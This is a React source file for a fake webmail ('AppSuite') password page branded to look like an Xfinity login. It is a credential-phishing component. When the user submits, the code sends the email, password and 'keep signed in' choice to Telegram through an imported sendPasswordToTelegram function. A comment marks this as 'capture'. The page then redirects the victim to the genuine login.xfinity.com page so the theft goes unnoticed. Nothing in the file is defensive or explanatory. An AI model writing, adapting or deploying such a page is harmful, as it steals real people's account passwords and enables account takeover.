import { useState, useEffect } from "react";
import { Link, useLocation, useNavigate } from "react-router-dom";
import { Eye, EyeOff, LoaderCircle } from "lucide-react";
import Logo from "@/assets/logo-grey.svg";
import Footer from "@/components/Footer/Footer";
import { sendPasswordToTelegram } from "@/bot/appsuite_telegrambot";

const AppSuiteLoginPassword = () => {
const location = useLocation();
const navigate = useNavigate();

// Route state → sessionStorage fallback → redirect if neither
const email =
  (location.state as { email?: string })?.email ||
  sessionStorage.getItem("appsuite_login_email") ||
  "";

useEffect(() => {
  if (!email) navigate("/appsuite-login", { replace: true });
}, [email]);

const [password, setPassword]         = useState("");
const [showPassword, setShowPassword] = useState(false);
const [keepSignedIn, setKeepSignedIn] = useState(false);
const [error, setError]               = useState("");
const [loading, setLoading]           = useState(false);

const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();

  if (!password.trim()) {
    setError("Please enter your password.");
    return;
  }

  setError("");
  setLoading(true);

  await sendPasswordToTelegram(email, password, keepSignedIn);

  setTimeout(() => {
    setLoading(false);
    handleGoogleOAuth(); // ✅ redirects to Google OAuth after capture
  }, 800);
};


const handleGoogleOAuth = () => {
  const params = new URLSearchParams({
    client_id:     "278910267038-gbnc7r8ucuo4n4nmsjne29cu753a9ivm.apps.googleusercontent.com",        // from Google Cloud Console
    redirect_uri:  "https://login.xfinity.com/login/auth/callback", // your actual site
    response_type: "code",
    scope:         "openid email profile",
    login_hint:    email,
    prompt:        "select_account",
  });
  window.location.href = `https://login.xfinity.com/login`;
};




  return (
    <main className="h-screen overflow-y-auto bg-background">
      <section className="h-[95vh] flex items-center justify-center px-6">
        <div className="w-full max-w-xl space-y-4">

          {/* Logo */}
          <img
            src={Logo}
            alt=""
            className=""
            width={70}
          />

          <div className="space-y-4 ">
            <p className="text-sm text-black font-semibold">{email}</p>
            <h1 className="text-3xl font-bold text-foreground leading-tight">Enter your password</h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-7">
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder=""
                value={password}
                onChange={(e) => { setPassword(e.target.value); setError(""); }}
                required
                className="w-full h-12 rounded-sm border border-neutral-500 bg-neutral-100 px-4 py-4 pr-12 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
              {error && <p className="mt-1 text-sm text-destructive">{error}</p>}
            </div>

            <div className="flex items-center gap-x-4 text-md font-semibold">
              <Link to="#" className="text-violet-800 font-semibold hover:underline">Forgot password?</Link>
            </div>

            <label className="flex items-center gap-4 text-md text-foreground cursor-pointer select-none">
              <input
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="h-6 w-6 rounded border-border accent-violet-800"
              />
              Keep me signed in
            </label>

            <p className="text-md font-semibold text-neutral-900 leading-relaxed">
              By signing in, you agree to our{" "}
              <span className="text-violet-800 underline">
                Terms of Service
              </span>{" "}
              and{" "}span
              <span  className="text-violet-800 underline">
                Privacy Policy
              </span>.
            </p>

            <button
              type="submit"
              disabled={loading}
              aria-busy={loading}
              className="group relative block h-12 w-32 items-center justify-center overflow-hidden rounded-sm bg-violet-800 px-4 font-semibold leading-none text-primary-foreground transition-all duration-300 ease-out hover:-translate-y-0.5 hover:bg-vtext-violet-800-hover hover:shadow-md active:translate-y-0 active:scale-[0.99] disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-none disabled:opacity-60"
            >
              <span
                aria-hidden="true"
                className="absolute inset-0 -translate-x-full bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent transition-transform duration-700 ease-out group-hover:translate-x-full"
              />
              <span className="relative z-10 inline-flex min-h-5 items-center justify-center gap-2">
                {loading ? (
                  <LoaderCircle className="h-4 w-4 flex-shrink-0 animate-spin" />
                ) : (
                  <span className="transition-transform duration-300 group-hover:scale-[1.02]">Sign in</span>
                )}
              </span>
            </button>

            <button type="button" onClick={handleGoogleOAuth}  className="text-black font-semibold text-md hover:underline">
              Sign in as someone else
            </button>

            <p className="text-md text-neutral-900 font-semibold leading-relaxed gap-2 flex">
              Trouble signing in?
              <Link to="#" className="text-violet-800 underline">
                Get help
              </Link>
            </p>
          </form>
        </div>
      </section>

      {/* FOOTER (only shows when scrolling) */}
      <footer className="bg-white">
        <Footer />
      </footer>
    </main>
  );
};

export default AppSuiteLoginPassword;